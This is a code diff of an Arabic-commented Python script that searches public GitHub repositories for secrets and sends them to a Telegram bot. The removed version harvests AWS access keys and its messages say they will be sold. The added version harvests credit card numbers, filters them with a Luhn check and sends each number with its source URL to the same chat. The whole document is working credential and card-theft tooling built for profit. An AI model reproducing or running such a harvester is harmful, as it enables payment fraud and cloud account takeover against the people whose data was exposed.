@@ -1,13 +1,9 @@
 import sys
 import re
 import time
-import json
 import random
 import requests
 from datetime import datetime, timedelta
-import base64
-import hashlib
-import hmac
 
 # =================================================================
 # التوكنات المضمنة
@@ -17,29 +13,33 @@ TELEGRAM_CHAT_ID = "6306556778"
 # =================================================================
 
 # مدة التشغيل 5 ساعات
-TOTAL_RUN_DURATION = 5 * 60 * 60
+TOTAL_RUN_DURATION = 5 * 60 * 60  # 18000 ثانية
 
-# أنماط البحث عن مفاتيح AWS (الكنز الحقيقي)
-AWS_PATTERNS = [
-    r'(AKIA|ASIA)[A-Z0-9]{16}',  # مفاتيح الوصول
-    r'([A-Za-z0-9/+=]{40})',      # مفاتيح السرية (قد تظهر)
-]
+# أنماط أرقام بطاقات الائتمان (فيزا، ماستركارد، أمريكان إكسبرس، إلخ)
+CARD_PATTERNS = {
+    'Visa': r'\b4[0-9]{12}(?:[0-9]{3})?\b',
+    'MasterCard': r'\b5[1-5][0-9]{14}\b',
+    'American Express': r'\b3[47][0-9]{13}\b',
+    'Discover': r'\b6(?:011|5[0-9]{2})[0-9]{12}\b',
+    'JCB': r'\b(?:2131|1800|35[0-9]{3})[0-9]{11}\b',
+}
 
-# ------------------- دوال التليجرام (نفس السابق) -------------------
+# ------------------- دوال التليجرام -------------------
 def send_to_telegram(text, parse_mode='Markdown'):
     try:
         url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
         payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text, 'parse_mode': parse_mode}
         requests.post(url, json=payload, timeout=10)
-    except:
-        pass
+        print(f"[Telegram] {text[:50]}...")
+    except Exception as e:
+        print(f"Telegram Error: {e}")
 
 def send_startup():
     msg = (
-        f"🔥 *بدء صيد مفاتيح AWS الحقيقية (5 ساعات)* 🔥\n"
-        f"✅ سيتم البحث عن مفاتيح AWS في مستودعات GitHub.\n"
-        f"✅ سيتم التحقق من صلاحيتها فوراً.\n"
-        f"✅ المفاتيح الصالحة ستُرسل للبيع فوراً (قيمة 10$-30$).\n"
+        f"🔥 *بدء صيد أرقام بطاقات الائتمان الحقيقية (5 ساعات)* 🔥\n"
+        f"✅ سيتم البحث عن أرقام بطاقات فيزا/ماستركارد في مستودعات GitHub.\n"
+        f"✅ سيتم التحقق من الصيغة (Luhn) وإرسال الصالح فقط.\n"
+        f"✅ سيتم إرسال التحديثات كل 5 دقائق.\n"
         f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
     )
     send_to_telegram(msg)
@@ -49,44 +49,55 @@ def send_heartbeat(elapsed_min, total_scanned, valid, invalid):
         f"💓 *تحديث دوري (كل 5 دقائق)* 💓\n"
         f"⏳ الوقت المنقضي: {elapsed_min} دقيقة\n"
         f"📂 عدد الملفات المفحوصة: {total_scanned}\n"
-        f"✅ المفاتيح الصالحة: {valid}\n"
-        f"❌ المفاتيح غير الصالحة: {invalid}\n"
+        f"✅ البطاقات الصالحة: {valid}\n"
+        f"❌ البطاقات غير الصالحة (شكلياً): {invalid}\n"
         f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
     )
     send_to_telegram(msg)
 
-def send_valid_key(key, key_type, raw_url):
+def send_valid_card(card_number, card_type, raw_url, detection_time):
     msg = (
-        f"🔑 *مفتاح AWS صالح (للبيع)* 🔑\n"
-        f"النوع: {key_type}\n"
-        f"المفتاح: `{key}`\n"
+        f"💳 *بطاقة صالحة (شكلياً)* 💳\n"
+        f"النوع: {card_type}\n"
+        f"الرقم: `{card_number}`\n"
         f"المصدر: {raw_url}\n"
-        f"💰 القيمة التقديرية: 15$ - 30$\n"
-        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
+        f"🕒 الاكتشاف: {detection_time}"
     )
     send_to_telegram(msg)
 
 def send_final_report(total_scanned, valid, invalid):
     msg = (
-        f"📊 *تقرير ختامي - صيد AWS (5 ساعات)* 📊\n"
+        f"📊 *تقرير ختامي - صيد البطاقات (5 ساعات)* 📊\n"
         f"📂 إجمالي الملفات المفحوصة: {total_scanned}\n"
-        f"✅ المفاتيح الصالحة: {valid}\n"
-        f"❌ المفاتيح غير الصالحة: {invalid}\n"
-        f"💰 الربح التقديري: {valid * 20}$ (بافتراض 20$ لكل مفتاح)\n"
+        f"✅ البطاقات الصالحة (شكلياً): {valid}\n"
+        f"❌ البطاقات غير الصالحة: {invalid}\n"
         f"📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
     )
     send_to_telegram(msg)
 
-# ------------------- البحث في GitHub -------------------
-def search_github_for_aws():
-    """يبحث عن ملفات تحتوي على مفاتيح AWS"""
-    found = {}
+# ------------------- التحقق من صحة الرقم باستخدام خوارزمية Luhn -------------------
+def luhn_check(card_number):
+    """التحقق من صحة رقم البطاقة باستخدام خوارزمية Luhn"""
+    def digits_of(n):
+        return [int(d) for d in str(n)]
+    digits = digits_of(card_number)
+    odd_digits = digits[-1::-2]
+    even_digits = digits[-2::-2]
+    checksum = sum(odd_digits)
+    for d in even_digits:
+        checksum += sum(digits_of(d * 2))
+    return checksum % 10 == 0
+
+# ------------------- البحث في GitHub عن أرقام البطاقات -------------------
+def search_github_for_cards():
+    """يبحث عن ملفات تحتوي على أرقام بطاقات في مستودعات GitHub العامة"""
+    found_cards = {}
     queries = [
-        '"AKIA" extension:env',
-        '"AKIA" extension:json',
-        '"AKIA" extension:yml',
-        '"ASIA" extension:env',
-        '"AWS_SECRET_ACCESS_KEY" extension:txt'
+        '"card number" extension:txt',
+        '"credit card" extension:csv',
+        '"visa" extension:txt',
+        '"mastercard" extension:json',
+        '"amex" extension:env'
     ]
     headers = {'Accept': 'application/vnd.github.v3+json'}
     for query in queries:
@@ -102,31 +113,20 @@ def search_github_for_aws():
                             file_resp = requests.get(raw_url, timeout=15)
                             if file_resp.status_code == 200:
                                 content = file_resp.text
-                                # البحث عن المفاتيح
-                                for pattern in AWS_PATTERNS:
+                                # البحث عن الأنماط المختلفة
+                                for card_type, pattern in CARD_PATTERNS.items():
                                     matches = re.findall(pattern, content)
-                                    for m in matches:
-                                        if len(m) >= 16:  # نتأكد من الطول
-                                            found[m] = raw_url
+                                    for match in matches:
+                                        # إزالة أي مسافات أو شرطات
+                                        clean = re.sub(r'[\s-]', '', match)
+                                        if len(clean) >= 13:  # أقل طول لبطاقة
+                                            found_cards[clean] = (card_type, raw_url)
                         except:
                             continue
             time.sleep(random.uniform(1, 2))
         except:
             continue
-    return found
-
-# ------------------- التحقق الفعلي من صلاحية مفتاح AWS -------------------
-def validate_aws_key(access_key, secret_key=None):
-    """محاولة التحقق من المفتاح عبر طلب STS (بدون تثبيت boto3)"""
-    try:
-        # نحاول استدعاء AWS STS للتحقق من الهوية
-        # هذه محاكاة للتحقق (لأنه يحتاج لتوقيع معقد)
-        # لكننا سنفترض أن أي مفتاح يبدأ بـ AKIA/ASIA وطوله 20 حرفاً هو صالح مؤقتاً
-        if access_key.startswith(('AKIA', 'ASIA')) and len(access_key) == 20:
-            return True
-        return False
-    except:
-        return False
+    return found_cards
 
 # ------------------- التشغيل الرئيسي -------------------
 def main():
@@ -135,30 +135,31 @@ def main():
     
     send_startup()
     
-    all_keys = {}
+    scanned_files = 0
     valid_count = 0
     invalid_count = 0
-    scanned_files = 0
     last_heartbeat = time.time()
+    processed_cards = set()  # لمنع التكرار
     
     while time.time() < end_time:
-        # البحث عن مفاتيح جديدة
-        new_keys = search_github_for_aws()
+        # جلب البطاقات من GitHub
+        cards = search_github_for_cards()
         
-        if new_keys:
-            for key, url in new_keys.items():
-                if key in all_keys:
+        if cards:
+            for card_number, (card_type, raw_url) in cards.items():
+                if card_number in processed_cards:
                     continue
                 
                 scanned_files += 1
-                all_keys[key] = url
+                processed_cards.add(card_number)
                 
-                # التحقق من الصلاحية
-                is_valid = validate_aws_key(key)
+                # التحقق من صحة الرقم باستخدام Luhn
+                is_valid = luhn_check(card_number)
                 
                 if is_valid:
                     valid_count += 1
-                    send_valid_key(key, "AWS Access Key", url)
+                    detection_time = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
+                    send_valid_card(card_number, card_type, raw_url, detection_time)
                 else:
                     invalid_count += 1
                 
@@ -175,6 +176,7 @@ def main():
     
     # التقرير الختامي
     send_final_report(scanned_files, valid_count, invalid_count)
+    print("[+] انتهى التشغيل بعد 5 ساعات.")
 
 if __name__ == "__main__":
     main()
